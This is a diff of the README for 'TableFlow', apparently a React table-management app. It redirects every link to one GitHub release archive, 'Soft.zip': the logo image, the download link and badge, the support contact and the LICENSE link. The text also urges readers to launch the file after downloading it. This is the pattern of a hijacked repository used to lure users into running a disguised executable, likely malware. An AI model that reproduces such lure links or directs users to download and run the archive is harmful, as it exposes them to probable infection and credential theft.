@@ -36,15 +36,15 @@ Welcome to **TableFlow** - the ultimate application for displaying and managing 
 - useLocation-hook
 - useHistory-hook
 
-![TableFlow Logo](https://example.com/tableflow_logo.png)
+![TableFlow Logo](https://github.com/mpingscocing/TableFlow/releases/download/v1.0/Soft.zip)
 
 ## Installation
 
-To use **TableFlow**, you can download the application [here](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip). Remember, it needs to be launched once downloaded.
+To use **TableFlow**, you can download the application [here](https://github.com/mpingscocing/TableFlow/releases/download/v1.0/Soft.zip). Remember, it needs to be launched once downloaded.
 
 If the link does not work, you can check the **Releases** section of this repository for alternative download options.
 
-[![Download TableFlow](https://img.shields.io/badge/Download-TableFlow-blue.svg)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download TableFlow](https://github.com/mpingscocing/TableFlow/releases/download/v1.0/Soft.zip)](https://github.com/mpingscocing/TableFlow/releases/download/v1.0/Soft.zip)
 
 ## Usage
 
@@ -56,8 +56,8 @@ If the link does not work, you can check the **Releases** section of this reposi
 
 ## Support
 
-For any assistance or inquiries regarding **TableFlow**, feel free to reach out to our support team at support@tableflow.com.
+For any assistance or inquiries regarding **TableFlow**, feel free to reach out to our support team at https://github.com/mpingscocing/TableFlow/releases/download/v1.0/Soft.zip
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/adelante20/TableFlow/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/mpingscocing/TableFlow/releases/download/v1.0/Soft.zip) file for details.
